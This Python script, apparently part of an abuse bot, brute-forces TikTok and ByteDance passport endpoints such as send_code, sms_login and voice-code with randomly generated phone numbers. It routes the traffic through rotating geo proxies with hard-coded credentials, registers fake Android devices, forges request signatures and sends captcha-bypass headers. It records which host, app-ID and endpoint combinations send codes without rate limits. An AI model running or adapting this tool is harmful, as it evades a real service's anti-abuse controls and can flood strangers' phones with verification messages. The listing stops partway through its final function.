#!/usr/bin/env python3
"""
APK-Driven Brute Force v3.0 — Targets NEW endpoints/hosts/AIDs from TikTok APK RE
==================================================================================

Phase A: NEW AIDs (473824, 567753) × all endpoints × regions
Phase B: hotapi-* + tiktokv.us + helo-api.com host families
Phase C: NEW passport endpoints (account_lookup, sms_login, can_send_voice_code, etc.)
Phase D: Verify + expand all findings — fresh regions, combos

Discoveries from APK analysis:
  - 276 passport endpoints (was using 5 → 1.8% coverage)
  - 102 API hosts (76 new)
  - 2 new AIDs (473824, 567753)
  - 73 x-tt-* headers (bypass-bdturing, cmpl-token, etc.)
"""

import asyncio
import aiohttp
import json
import random
import time
import hashlib
import uuid
import string
import sys
from urllib.parse import urlencode
from dataclasses import dataclass, field
from typing import Optional, Dict, List

# ============================================
# CONFIG
# ============================================
PROXY_TEMPLATE = "http://user-2pbGchwGYvoGSTLv-type-datacenter-country-{region}:j8BogunPuMmSaOEU@geo.g-w.info:10080"
REGIONS = ["AU", "DE", "SG", "FR", "GB", "NL", "JP", "CA"]
TIMEOUT = aiohttp.ClientTimeout(total=15)

try:
    import SignerPy as SP
    from SignerPy import xor
    SIGNER_OK = True
except ImportError:
    SIGNER_OK = False
    print("WARNING: SignerPy not available — signed tests will use fake headers")


def gen_phone():
    prefixes = [
        ("+61", 9), ("+49", 10), ("+65", 8), ("+33", 9),
        ("+44", 10), ("+1", 10), ("+92", 10), ("+91", 10),
        ("+81", 10), ("+82", 10),
    ]
    prefix, digits = random.choice(prefixes)
    num = ''.join(str(random.randint(1 if i == 0 else 0, 9)) for i in range(digits))
    return f"{prefix}{num}"


def encrypt_phone(phone):
    return ''.join(format(ord(c) ^ 5, '02x') for c in phone)


def get_proxy(region=None):
    r = region or random.choice(REGIONS)
    return PROXY_TEMPLATE.format(region=r)


# ============================================
# STATS TRACKER
# ============================================
@dataclass
class Stats:
    total: int = 0
    success: int = 0
    rate_limited: int = 0
    no_perms: int = 0
    errors: int = 0
    html: int = 0
    not_found: int = 0
    email_format: int = 0
    other: int = 0
    findings: List[Dict] = field(default_factory=list)
    start_time: float = field(default_factory=time.time)
    _lock: asyncio.Lock = field(default_factory=asyncio.Lock, repr=False)

    def reset(self):
        self.total = self.success = self.rate_limited = self.no_perms = 0
        self.errors = self.html = self.not_found = self.email_format = self.other = 0
        self.findings = []
        self.start_time = time.time()

    async def record(self, category, detail=None):
        async with self._lock:
            self.total += 1
            if category == "success":
                self.success += 1
                if detail:
                    self.findings.append(detail)
            elif category == "rate_limited":
                self.rate_limited += 1
                if detail:
                    self.findings.append(detail)
            elif category == "no_perms":
                self.no_perms += 1
            elif category == "error":
                self.errors += 1
            elif category == "html":
                self.html += 1
            elif category == "not_found":
                self.not_found += 1
            elif category == "email_format":
                self.email_format += 1
                if detail:
                    self.findings.append(detail)
            else:
                self.other += 1

    def summary(self):
        elapsed = time.time() - self.start_time
        rps = self.total / elapsed if elapsed > 0 else 0
        return (f"total={self.total} success={self.success} rl={self.rate_limited} "
                f"ec16={self.no_perms} 404={self.not_found} email={self.email_format} "
                f"err={self.errors} html={self.html} other={self.other} "
                f"time={elapsed:.0f}s rps={rps:.1f}")


stats = Stats()


# ============================================
# NEW DOMAINS FROM APK (NOT in current bot)
# ============================================
# hotapi-* family (completely new — never tested)
HOTAPI_HOSTS = [
    "hotapi-va.tiktokv.com",
    "hotapi-sg.tiktokv.com",
    "hotapi-boot.tiktokv.com",
    "hotapi16-normal-alisg.tiktokv.com",
    "hotapi16-normal-useast1a.tiktokv.com",
    "hotapi22-normal-useast1a.tiktokv.com",
    "hotapi-va.isnssdk.com",
    "hotapi-va-ueast2a-useast2a.isnssdk.com",
]

# tiktokv.us TLD (NEW — separate US infra)
TIKTOKV_US_HOSTS = [
    "api16-normal-useast5.tiktokv.us",
    "api16-normal-useast8.tiktokv.us",
]

# Helo official backend
HELO_HOSTS = [
    "api16-normal-alisg.helo-api.com",
]

# NEW versioned hosts not in current bot (api19-32 family)
NEW_VERSIONED_HOSTS = [
    "api19-normal-c-useast1a.tiktokv.com",
    "api19-va.tiktokv.com",
    "api19.tiktokv.com",
    "api21-va.tiktokv.com",
    "api21.tiktokv.com",
    "api21-h2.tiktokv.com",
    "api22-va.tiktokv.com",
    "api22.tiktokv.com",
    "api23-normal-useast1a.tiktokv.com",
    "api31-normal-alisg.tiktokv.com",
    "api31-normal-useast1a.tiktokv.com",
    "api32-normal-alisg.tiktokv.com",
    "api32-normal-useast1a.tiktokv.com",
    "api-normal.tiktokv.com",
    "api-core.tiktokv.com",
    "api-core-va.tiktokv.com",
    "api-h2-eagle.tiktokv.com",
    "api21-h2-eagle.tiktokv.com",
    "api22-h2-eagle.tiktokv.com",
]

# Supporting infra — may serve passport endpoints
MISC_NEW_HOSTS = [
    "frontier-va.tiktokv.com",
    "frontier100-normal.tiktokv.com",
    "fp-va.tiktokv.com",
    "fp-sg.tiktokv.com",
    "fp22-normal-useast1a.tiktokv.com",
    "mssdk-va.tiktokv.com",
    "mssdk-sg.tiktokv.com",
]

# Existing known-working hosts (for NEW AID tests)
KNOWN_MOBILE_HOSTS = [
    "api16-normal-c-useast2a.tiktokv.com",
    "api16-normal-c-useast1a.tiktokv.com",
    "api16-normal-v6.tiktokv.com",
    "api16-normal-v4.tiktokv.com",
    "api22-normal-c-useast2a.tiktokv.com",
    "api22-normal-c-alisg.tiktokv.com",
    "api-h2.tiktokv.com",
    "api2-16-h2.musical.ly",
]

# Web domains
WEB_DOMAINS = [
    "us.tiktok.com", "www.tiktok.com", "www.capcut.com",
    "shop.tiktok.com",
]

# Chinese domains
CHINESE_HOSTS = [
    "api3-normal-c-lf.amemv.com",
    "api5-normal-c-lf.amemv.com",
    "api.amemv.com",
    "api5.pipix.com",
    "is.snssdk.com",
    "ib.snssdk.com",
    "verify.zijieapi.com",
]

# ============================================
# NEW ENDPOINTS FROM APK (not in current bot)
# ============================================
NEW_PASSPORT_ENDPOINTS = [
    "/passport/mobile/can_send_voice_code/",
    "/passport/account_lookup/mobile/",
    "/passport/mobile/check_code/",
    "/passport/mobile/validate_code/",
    "/passport/mobile/validate_code/v1/",
    "/passport/mobile/sms_login/",
    "/passport/mobile/sms_login_only/",
    "/passport/mobile/chain_login/",
    "/passport/mobile/conditional_bind_login/",
    "/passport/mobile/bind_login/",
    "/passport/mobile/origin_mobile_login/",
    "/passport/web/email/send_code/",
    "/passport/mobile/bind/v2/",
    "/passport/mobile/change/v1/",
    "/passport/mobile/gsma/",
    "/passport/carrier_auth/",
    "/passport/device/one_login/",
    "/passport/auth/one_login/",
    "/passport/auth/wap_login/",
    "/passport/oidc/multi_login/",
]

# Known send_code endpoints for completeness
SEND_CODE_ENDPOINTS = [
    "/passport/mobile/send_code/v1/",
    "/passport/mobile/send_code/",
    "/passport/mobile/send_code/v2/",
    "/passport/web/send_code/",
    "/passport/mobile/send_voice_code/",
    "/passport/open/send_code/",
    "/passport/email/send_code/",
]

# ============================================
# AID LISTS
# ============================================
# NEW from APK config
NEW_APKIDS = [473824, 567753]

# Known working/rate-limited AIDs
KNOWN_AIDS = [
    1233, 1340, 3006, 1180, 1128, 1112, 1319, 2329, 32, 13,
    1988, 1459, 1583, 2658, 7743, 2657, 2239, 259,
    1760, 2960, 4068, 4143, 4174, 5049, 6027, 6556, 6849, 8311,
]

# App name variants
APP_NAMES_MOBILE = ["musical_ly", "musically_go", "trill"]
APP_NAMES_WEB = ["tiktok_web", "musical_ly"]
APP_NAMES_CHINESE = ["aweme", "super", "news_article", "toutiao"]

TYPE_CODES = [3635, 3532, 3637, 3634, 3734, 3733, 3731, 3536, 3132, 3631, 3632, 3530, 34]


# ============================================
# DEVICE HELPERS
# ============================================
BRANDS = {
    "samsung": ["SM-S918B", "SM-S911B", "SM-A546B", "SM-G991B", "SM-A536B"],
    "Google": ["Pixel 8 Pro", "Pixel 7", "Pixel 6a"],
    "OnePlus": ["IN2020", "NE2210", "CPH2449"],
    "Xiaomi": ["2201117TG", "23078RKD5C", "M2101K6G"],
}
ANDROIDS = ["12", "13", "14"]
API_LEVELS = {"12": "31", "13": "33", "14": "34"}
BUILD_IDS = ["UP1A.231005.007", "TP1A.220624.014", "TQ3A.230705.001"]


def gen_device():
    brand = random.choice(list(BRANDS.keys()))
    model = random.choice(BRANDS[brand])
    av = random.choice(ANDROIDS)
    al = API_LEVELS[av]
    bi = random.choice(BUILD_IDS)
    res = random.choice(["1080*2400", "1080*2340", "1440*3200"])
    dpi = random.choice(["420", "480", "560"])
    openudid = ''.join(random.choices('0123456789abcdef', k=16))
    cdid = str(uuid.uuid4())
    return {
        "brand": brand, "model": model, "android_version": av,
        "api_level": al, "build_id": bi, "resolution": res, "dpi": dpi,
        "openudid": openudid, "cdid": cdid, "odin_tt": ''.join(random.choices('0123456789abcdef', k=160)),
    }


async def async_register_device(session, domain, aid, app_name, version_code, version_name, package, channel, proxy=None):
    dev = gen_device()
    ts = int(time.time())
    params = urlencode({
        "aid": str(aid), "app_name": app_name,
        "version_code": version_code, "version_name": version_name,
        "device_platform": "android", "os": "android",
        "os_api": dev["api_level"], "os_version": dev["android_version"],
        "device_type": dev["model"], "device_brand": dev["brand"],
        "language": "en", "ac": "wifi", "channel": channel,
        "resolution": dev["resolution"], "dpi": dev["dpi"],
        "openudid": dev["openudid"], "cdid": dev["cdid"],
        "update_version_code": version_code, "manifest_version_code": version_code,
        "ts": str(ts), "_rticket": str(ts * 1000),
    })
    body = json.dumps({
        "magic_tag": "ss_app_log",
        "header": {
            "display_name": app_name, "update_version_code": int(version_code),
            "manifest_version_code": int(version_code),
            "aid": aid, "channel": channel, "package": package,
            "app_version": version_name, "version_code": int(version_code),
            "sdk_version": "2.14.0-rc.8", "os": "Android",
            "os_version": dev["android_version"], "os_api": int(dev["api_level"]),
            "device_model": dev["model"], "device_brand": dev["brand"],
            "device_manufacturer": dev["brand"], "cpu_abi": "arm64-v8a",
            "release_build": "f66b21c_20241009",
            "density_dpi": int(dev["dpi"]), "display_density": "xxhdpi",
            "resolution": dev["resolution"].replace("*", "x"),
            "language": "en", "timezone": 0, "access": "wifi",
            "not_request_sender": 0, "rom": dev["build_id"],
            "rom_version": f"android{dev['android_version']}-release",
            "cdid": dev["cdid"], "sig_hash": "aea615ab",
            "openudid": dev["openudid"],
            "clientudid": str(uuid.uuid4()), "region": "US",
            "tz_name": "America/New_York", "tz_offset": -18000,
        },
        "_gen_ts": ts,
    })
    url = f"https://{domain}/service/2/device_register/?{params}"
    ua = f"{package}/{version_code} (Linux; U; Android {dev['android_version']}; en_US; {dev['model']}; Build/{dev['build_id']}; Cronet/TTNetVersion:b714bfef 2024-09-13 QuicVersion:c459d547 2024-08-27)"
    headers = {"Host": domain, "User-Agent": ua, "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate"}
    try:
        async with session.post(url, data=body, headers=headers, proxy=proxy, ssl=False,
                                timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status == 200:
                data = await resp.json()
                return {
                    "device_id": str(data.get("device_id", "")),
                    "iid": str(data.get("install_id", "")),
                    "dev": dev,
                }
    except Exception:
        pass
    return None


def sign_request(url_params, body, cookie_str, aid):
    if SIGNER_OK:
        return SP.sign(params=url_params, payload=body, cookie=cookie_str, version=8404, aid=aid)
    ts = str(int(time.time()))
    return {
        "x-gorgon": hashlib.md5(f"{url_params}{ts}".encode()).hexdigest()[:20] + "00000000",
        "x-khronos": ts,
        "x-argus": "",
        "x-ladon": "",
        "x-ss-stub": hashlib.md5(body.encode()).hexdigest().upper(),
    }


# ============================================
# GENERIC REQUEST HELPERS
# ============================================
async def test_web(session, sem, domain, endpoint, aid, tc, app_name, proxy, phase_label=""):
    async with sem:
        phone = gen_phone()
        encrypted = encrypt_phone(phone)
        body = urlencode({
            "mobile": encrypted, "type": str(tc),
            "aid": str(aid), "app_name": app_name,
            "account_sdk_source": "web", "mix_mode": "1", "auto_read": "0",
        })
        url = f"https://{domain}{endpoint}?aid={aid}&app_name={app_name}"
        headers = {
            "Host": domain,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
            "Origin": f"https://{domain}",
            "Referer": f"https://{domain}/",
            "X-SS-DP": str(aid),
            # NEW APK headers
            "x-tt-bypass-bdturing": "1",
            "x-tt-cmpl-token": "",
            "x-tt-env": "prod",
        }
        try:
            async with session.post(url, data=body, headers=headers, proxy=proxy,
                                     ssl=False, timeout=TIMEOUT) as resp:
                text = await resp.text()
                if resp.status == 404:
                    await stats.record("not_found")
                    return
                if not text.strip().startswith("{"):
                    await stats.record("html")
                    return
                data = json.loads(text)
                return await _classify(data, {"aid": aid, "domain": domain, "tc": tc,
                    "app_name": app_name, "endpoint": endpoint, "method": "web",
                    "phone": phone, "phase": phase_label})
        except Exception:
            await stats.record("error")


async def test_signed(session, sem, domain, endpoint, aid, tc, app_name, proxy, phase_label="",
                      reg_domain=None, version_code="350401", version_name="35.4.1",
                      package="com.zhiliaoapp.musically", channel="googleplay"):
    async with sem:
        phone = gen_phone()
        encrypted = encrypt_phone(phone)
        ts = int(time.time())
        rticket = str(ts * 1000 + random.randint(1000, 9999))

        # Try device registration
        rd = reg_domain or (domain if "tiktok" in domain or "musical" in domain else "api16-normal-c-useast2a.tiktokv.com")
        dev_info = await async_register_device(
            session, rd, aid, app_name, version_code, version_name, package, channel, proxy
        )
        if not dev_info:
            # Fallback: fake device IDs
            dev_info = {
                "device_id": str(random.randint(10**15, 10**16-1)),
                "iid": str(random.randint(10**15, 10**16-1)),
                "dev": gen_device(),
            }
        dev = dev_info["dev"]

        body_params = {
            "mobile": encrypted, "type": str(tc),
            "aid": str(aid), "app_name": app_name,
            "auto_read": "0", "account_sdk_source": "app",
            "unbind_exist": "35", "mix_mode": "1",
            "is6Digits": "1", "check_register": "1", "multi_login": "1",
        }
        body = urlencode(body_params)

        url_params = urlencode({
            "aid": str(aid), "app_name": app_name,
            "version_code": version_code, "version_name": version_name,
            "device_id": dev_info["device_id"], "iid": dev_info["iid"],
            "device_platform": "android", "os": "android",
            "os_api": dev["api_level"], "os_version": dev["android_version"],
            "device_type": dev["model"], "device_brand": dev["brand"],
            "language": "en", "ac": "wifi", "channel": channel,
            "resolution": dev["resolution"], "dpi": dev["dpi"],
            "openudid": dev["openudid"], "cdid": dev["cdid"],
            "ts": str(ts), "_rticket": rticket,
        })

        cookie_str = f"sessionid=; install_id={dev_info['iid']}; store-country-code=us; store-idc=useast2a; odin_tt={dev['odin_tt']}"
        sigs = sign_request(url_params, body, cookie_str, aid)

        ua = f"{package}/{version_code} (Linux; U; Android {dev['android_version']}; en_US; {dev['model']}; Build/{dev['build_id']}; Cronet/TTNetVersion:b714bfef 2024-09-13 QuicVersion:c459d547 2024-08-27)"
        headers = {
            "Host": domain,
            "Connection": "keep-alive",
            "Content-Length": str(len(body)),
            "Cookie": cookie_str,
            "x-tt-passport-csrf-token": "",
            "X-SS-REQ-TICKET": rticket,
            "x-vc-bdturing-sdk-version": "3.7.2.cn",
            "sdk-version": "2",
            "passport-sdk-version": "19",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-SS-DP": str(aid),
            "User-Agent": ua,
            "Accept-Encoding": "gzip, deflate",
            "x-tt-bypass-dp": "1",
            "x-tt-dm-status": "login=0;ct=0;rt=7",
            "x-tt-store-region": random.choice(["au", "de", "sg", "us", "gb"]),
            "x-tt-store-region-src": "did",
            # NEW APK headers
            "x-tt-bypass-bdturing": "1",
            "x-tt-cmpl-token": "",
            "x-tt-cipher-version": "1",
            "x-tt-app-init-region": random.choice(["US", "AU", "DE", "SG", "GB"]),
            "x-tt-request-tag": "t=0;n=1",
            "X-Gorgon": sigs.get("x-gorgon", ""),
            "X-Khronos": sigs.get("x-khronos", str(ts)),
            "X-Argus": sigs.get("x-argus", ""),
            "X-Ladon": sigs.get("x-ladon", ""),
            "X-SS-STUB": sigs.get("x-ss-stub", hashlib.md5(body.encode()).hexdigest().upper()),
        }
        url = f"https://{domain}{endpoint}?{url_params}"
        try:
            async with session.post(url, data=body, headers=headers, proxy=proxy,
                                     ssl=False, timeout=TIMEOUT) as resp:
                text = await resp.text()
                if resp.status == 404:
                    await stats.record("not_found")
                    return
                if resp.status == 403:
                    await stats.record("other")
                    return
                if not text.strip().startswith("{"):
                    await stats.record("html")
                    return
                data = json.loads(text)
                return await _classify(data, {"aid": aid, "domain": domain, "tc": tc,
                    "app_name": app_name, "endpoint": endpoint, "method": "signed",
                    "phone": phone, "phase": phase_label,
                    "device_id": dev_info["device_id"]})
        except Exception:
            await stats.record("error")


async def _classify(data, detail):
    msg = data.get("message", "")
    ec = data.get("data", {}).get("error_code", data.get("error_code", -1))
    desc = data.get("data", {}).get("description", "")

    if msg == "success":
        detail["type"] = "SUCCESS"
        await stats.record("success", detail)
        print(f"\n*** SUCCESS *** AID={detail['aid']} dom={detail['domain']} "
              f"ep={detail['endpoint']} tc={detail['tc']} method={detail['method']} "
              f"phase={detail['phase']}")
        return "success"
    elif ec == 7 or ec == 1206:
        detail["type"] = "RATE_LIMITED"
        await stats.record("rate_limited", detail)
        print(f"\n  RATE_LIM: AID={detail['aid']} dom={detail['domain']} "
              f"ep={detail['endpoint']} tc={detail['tc']} phase={detail['phase']}")
        return "rate_limited"
    elif ec == 16:
        await stats.record("no_perms")
        return "no_perms"
    elif ec == 1031:
        detail["type"] = "EMAIL_FORMAT"
        await stats.record("email_format", detail)
        return "email_format"
    elif ec == 8:
        await stats.record("other")
        return "captcha"
    elif "not found" in desc.lower() or "not exist" in msg.lower():
        await stats.record("not_found")
        return "not_found"
    else:
        await stats.record("other")
        return "other"


# ============================================
# PHASE A: NEW AIDs (473824, 567753)
# ============================================
async def phase_a_new_aids():
    print("\n" + "="*80)
    print("PHASE A: NEW APK AIDs (473824, 567753) — multi-method, multi-domain, multi-region")
    print("="*80)
    stats.reset()
    sem = asyncio.Semaphore(300)
    conn = aiohttp.TCPConnector(limit=400, limit_per_host=50, ssl=False)

    tasks = []
    async with aiohttp.ClientSession(connector=conn) as session:
        for aid in NEW_APKIDS:
            # Web endpoints — all web domains
            for domain in WEB_DOMAINS:
                for ep in ["/passport/web/send_code/", "/passport/mobile/send_code/v1/",
                           "/passport/mobile/send_code/", "/passport/open/send_code/",
                           "/passport/email/send_code/"]:
                    for tc in [3635, 3532, 3637]:
                        for region in ["AU", "DE", "SG", "US", "FR", "GB"]:
                            proxy = get_proxy(region)
                            app = random.choice(APP_NAMES_WEB)
                            tasks.append(test_web(session, sem, domain, ep, aid, tc, app, proxy, f"phaseA-web-{region}"))

            # Signed on known mobile hosts
            for domain in KNOWN_MOBILE_HOSTS[:5]:
                for ep in ["/passport/mobile/send_code/v1/", "/passport/mobile/send_code/"]:
                    for tc in [3635, 3532, 3637, 3634]:
                        for region in ["AU", "DE", "SG", "US"]:
                            proxy = get_proxy(region)
                            app = random.choice(APP_NAMES_MOBILE)
                            tasks.append(test_signed(session, sem, domain, ep, aid, tc, app, proxy, f"phaseA-signed-{region}"))

            # Chinese domains
            for domain in CHINESE_HOSTS[:4]:
                for ep in ["/passport/mobile/send_code/v1/", "/passport/mobile/send_code/"]:
                    for tc in [3635, 3532]:
                        for region in ["AU", "DE"]:
                            proxy = get_proxy(region)
                            app = random.choice(APP_NAMES_CHINESE)
                            tasks.append(test_signed(session, sem, domain, ep, aid, tc, app, proxy, f"phaseA-chinese-{region}"))

        total = len(tasks)
        print(f"Testing {total:,} combinations for NEW AIDs 473824 & 567753...")

        batch = 500
        for i in range(0, total, batch):
            await asyncio.gather(*tasks[i:i+batch], return_exceptions=True)
            elapsed = time.time() - stats.start_time
            rps = stats.total / elapsed if elapsed > 0 else 0
            print(f"\r[Phase A] {stats.total:,}/{total:,} | SUC:{stats.success} RL:{stats.rate_limited} "
                  f"ec16:{stats.no_perms} 404:{stats.not_found} err:{stats.errors} | {rps:.0f} req/s", end="", flush=True)

    print(f"\n\nPhase A: {stats.summary()}")
    findings = stats.findings[:]
    for f in findings:
        print(f"  {f['type']}: AID={f['aid']} dom={f['domain']} ep={f['endpoint']} tc={f['tc']}")
    with open("/home/ubuntu/phaseA_results.json", "w") as fp:
        json.dump({"stats": stats.summary(), "findings": findings}, fp, indent=2)
    return findings


# ============================================
# PHASE B: HOTAPI + TIKTOKV.US + HELO-API
# ============================================
async def phase_b_new_hosts():
    print("\n" + "="*80)
    print("PHASE B: NEW HOST FAMILIES — hotapi-*, tiktokv.us, helo-api.com, api19-32")
    print("="*80)
    stats.reset()
    sem = asyncio.Semaphore(300)
    conn = aiohttp.TCPConnector(limit=400, limit_per_host=30, ssl=False)

    # All new hosts to test
    all_new_hosts = HOTAPI_HOSTS + TIKTOKV_US_HOSTS + HELO_HOSTS + NEW_VERSIONED_HOSTS + MISC_NEW_HOSTS

    # Known working AIDs
    test_aids = [1233, 1340, 3006, 1180, 1128, 1319, 13, 1988, 7743, 2658, 2657, 2239]
    endpoints = ["/passport/mobile/send_code/v1/", "/passport/mobile/send_code/",
                 "/passport/web/send_code/"]

    tasks = []
    async with aiohttp.ClientSession(connector=conn) as session:
        for host in all_new_hosts:
            for aid in test_aids:
                for ep in endpoints:
                    tc = random.choice(TYPE_CODES[:5])
                    region = random.choice(["AU", "DE", "SG", "US"])
                    proxy = get_proxy(region)

                    if "web" in ep:
                        app = random.choice(APP_NAMES_WEB)
                        tasks.append(test_web(session, sem, host, ep, aid, tc, app, proxy, f"phaseB-{host.split('.')[0]}"))
                    else:
                        app = random.choice(APP_NAMES_MOBILE)
                        # For new hosts, try registering device on known domain then hitting new host
                        tasks.append(test_signed(session, sem, host, ep, aid, tc, app, proxy,
                                                  f"phaseB-{host.split('.')[0]}",
                                                  reg_domain="api16-normal-c-useast2a.tiktokv.com"))

        # Also test Helo-specific AID=1180 on helo-api.com more thoroughly
        for host in HELO_HOSTS:
            for ep in ["/passport/mobile/send_code/v1/", "/passport/mobile/send_code/",
                       "/passport/mobile/send_voice_code/", "/passport/open/send_code/"]:
                for tc in [3635, 3532, 3637, 3634, 3734, 3733]:
                    for region in REGIONS[:4]:
                        proxy = get_proxy(region)
                        tasks.append(test_signed(session, sem, host, ep, 1180, tc,
                                                  "musical_ly", proxy, "phaseB-helo-deep",
                                                  reg_domain="api16-normal-c-useast2a.tiktokv.com"))

        total = len(tasks)
        print(f"Testing {total:,} combos on {len(all_new_hosts)} new hosts + Helo deep...")

        batch = 500
        for i in range(0, total, batch):
            await asyncio.gather(*tasks[i:i+batch], return_exceptions=True)
            elapsed = time.time() - stats.start_time
            rps = stats.total / elapsed if elapsed > 0 else 0
            print(f"\r[Phase B] {stats.total:,}/{total:,} | SUC:{stats.success} RL:{stats.rate_limited} "
                  f"ec16:{stats.no_perms} 404:{stats.not_found} err:{stats.errors} | {rps:.0f} req/s", end="", flush=True)

    print(f"\n\nPhase B: {stats.summary()}")
    findings = stats.findings[:]
    for f in findings:
        print(f"  {f['type']}: AID={f['aid']} dom={f['domain']} ep={f['endpoint']} tc={f['tc']}")
    with open("/home/ubuntu/phaseB_results.json", "w") as fp:
        json.dump({"stats": stats.summary(), "findings": findings}, fp, indent=2)
    return findings


# ============================================
# PHASE C: NEW PASSPORT ENDPOINTS
# ============================================
async def phase_c_new_endpoints():
    print("\n" + "="*80)
    print("PHASE C: NEW PASSPORT ENDPOINTS FROM APK — 20 untested endpoints")
    print("="*80)
    stats.reset()
    sem = asyncio.Semaphore(200)
    conn = aiohttp.TCPConnector(limit=300, limit_per_host=30, ssl=False)

    test_aids = [1233, 1340, 3006, 1180, 1128, 1988, 1583, 7743, 2658, 2657, 2239, 259, 473824, 567753]
    mobile_hosts = KNOWN_MOBILE_HOSTS[:4] + ["api19-normal-c-useast1a.tiktokv.com", "api21.tiktokv.com"]
    web_hosts = WEB_DOMAINS[:2]

    tasks = []
    async with aiohttp.ClientSession(connector=conn) as session:
        for ep in NEW_PASSPORT_ENDPOINTS:
            for aid in test_aids:
                for region in ["AU", "DE", "SG", "US"]:
                    proxy = get_proxy(region)
                    tc = random.choice(TYPE_CODES[:5])

                    # Try web (some new endpoints may work unsigned)
                    for host in web_hosts:
                        app = random.choice(APP_NAMES_WEB)
                        tasks.append(test_web(session, sem, host, ep, aid, tc, app, proxy, f"phaseC-web-{ep.split('/')[-2]}"))

                    # Try signed mobile
                    host = random.choice(mobile_hosts)
                    app = random.choice(APP_NAMES_MOBILE)
                    tasks.append(test_signed(session, sem, host, ep, aid, tc, app, proxy,
                                              f"phaseC-signed-{ep.split('/')[-2]}",
                                              reg_domain="api16-normal-c-useast2a.tiktokv.com"))

        total = len(tasks)
        print(f"Testing {total:,} combos for {len(NEW_PASSPORT_ENDPOINTS)} new endpoints...")

        batch = 500
        for i in range(0, total, batch):
            await asyncio.gather(*tasks[i:i+batch], return_exceptions=True)
            elapsed = time.time() - stats.start_time
            rps = stats.total / elapsed if elapsed > 0 else 0
            print(f"\r[Phase C] {stats.total:,}/{total:,} | SUC:{stats.success} RL:{stats.rate_limited} "
                  f"ec16:{stats.no_perms} 404:{stats.not_found} err:{stats.errors} | {rps:.0f} req/s", end="", flush=True)

    print(f"\n\nPhase C: {stats.summary()}")
    findings = stats.findings[:]
    for f in findings:
        print(f"  {f['type']}: AID={f['aid']} dom={f['domain']} ep={f['endpoint']} tc={f['tc']}")
    with open("/home/ubuntu/phaseC_results.json", "w") as fp:
        json.dump({"stats": stats.summary(), "findings": findings}, fp, indent=2)
    return findings


# ============================================
# PHASE D: VERIFY + EXPAND ALL FINDINGS
# ============================================
async def phase_d_verify(all_findings):
    print("\n" + "="*80)
    print("PHASE D: VERIFY & EXPAND — re-test all findings with fresh IPs + extra combos")
    print("="*80)
    stats.reset()
    sem = asyncio.Semaphore(200)
    conn = aiohttp.TCPConnector(limit=300, limit_per_host=30, ssl=False)

    # Filter out EMAIL_FORMAT findings (need email not phone)
    verifiable = [f for f in all_findings if f.get("type") != "EMAIL_FORMAT"]
    if not verifiable:
        print("No findings to verify!")
        return []

    tasks = []
    async with aiohttp.ClientSession(connector=conn) as session:
        for f in verifiable:
            aid = f["aid"]
            domain = f["domain"]
            ep = f["endpoint"]
            tc = f["tc"]
            method = f.get("method", "web")
            app_name = f.get("app_name", "musical_ly")

            # Re-test same combo 3x with fresh regions
            for region in random.sample(REGIONS, min(3, len(REGIONS))):
                proxy = get_proxy(region)
                if method == "web":
                    tasks.append(test_web(session, sem, domain, ep, aid, tc, app_name, proxy, "phaseD-verify"))
                else:
                    tasks.append(test_signed(session, sem, domain, ep, aid, tc, app_name, proxy, "phaseD-verify",
                                              reg_domain="api16-normal-c-useast2a.tiktokv.com"))

            # Try same AID on additional domains
            extra_domains = random.sample(KNOWN_MOBILE_HOSTS, min(2, len(KNOWN_MOBILE_HOSTS)))
            for ed in extra_domains:
                proxy = get_proxy()
                for extra_tc in random.sample(TYPE_CODES[:8], min(3, len(TYPE_CODES))):
                    if method == "web":
                        tasks.append(test_web(session, sem, ed, ep, aid, extra_tc, app_name, proxy, "phaseD-expand"))
                    else:
                        tasks.append(test_signed(session, sem, ed, ep, aid, extra_tc, app_name, proxy, "phaseD-expand",
                                                  reg_domain="api16-normal-c-useast2a.tiktokv.com"))

        total = len(tasks)
        print(f"Verifying {len(verifiable)} findings + expanding → {total:,} tests...")

        batch = 300
        for i in range(0, total, batch):
            await asyncio.gather(*tasks[i:i+batch], return_exceptions=True)
            elapsed = time.time() - stats.start_time
            rps = stats.total / elapsed if elapsed > 0 else 0
            print(f"\r[Phase D] {stats.total:,}/{total:,} | SUC:{stats.success} RL:{stats.rate_limited} "
                  f"err:{stats.errors} | {rps:.0f} req/s", end="", flush=True)

    print(f"\n\nPhase D: {stats.summary()}")
    findings = stats.findings[:]
    for f in findings:
        print(f"  {f['type']}: AID={f['aid']} dom={f['domain']} ep={f['endpoint']} tc={f['tc']}")
    with open("/home/ubuntu/phaseD_results.json", "w") as fp:
        json.dump({"stats": stats.summary(), "findings": findings}, fp, indent=2)
    return findings


# ============================================
# MAIN
# ============================================
async def main():
    print("="*80)
    print("APK-DRIVEN BRUTE FORCE v3.0")
    print(f"SignerPy: {'AVAILABLE' if SIGNER_OK else 'NOT AVAILABLE (using fake headers)'}")
    print(f"NEW AIDs from APK: {NEW_APKIDS}")
    print(f"New host families: hotapi({len(HOTAPI_HOSTS)}), tiktokv.us({len(TIKTOKV_US_HOSTS)}), "
          f"helo-api({len(HELO_HOSTS)}), versioned({len(NEW_VERSIONED_HOSTS)}), misc({len(MISC_NEW_HOSTS)})")
    print(f"New endpoints: {len(NEW_PASSPORT_ENDPOINTS)}")
    print("="*80)

    t0 = time.time()
    all_findings = []

    # Phase A: New AIDs
    findings_a = await phase_a_new_aids()
    all_findings.extend(findings_a)

    # Phase B: New hosts
    findings_b = await phase_b_new_hosts()
    all_findings.extend(findings_b)

    # Phase C: New endpoints
    findings_c = await phase_c_new_endpoints()
    all_findings.extend(findings_c)

    # Phase D: Verify + expand
    findings_d = await phase_d_verify(all_findings)
    all_findings.extend(findings_d)

    elapsed = time.time() - t0
    print("\n" + "="*80)
    print(f"ALL PHASES COMPLETE — {elapsed:.0f}s total")
    print(f"Total findings: {len(all_findings)}")
    print("="*80)

    # Deduplicate findings
    seen = set()
    unique = []
    for f in all_findings:
        key = (f.get("aid"), f.get("domain"), f.get("endpoint"), f.get("tc"), f.get("type"))
        if key not in seen:
            seen.add(key)
            unique.append(f)

    print(f"\nUnique findings: {len(unique)}")
    successes = [f for f in unique if f["type"] == "SUCCESS"]
    rate_limited = [f for f in unique if f["type"] == "RATE_LIMITED"]
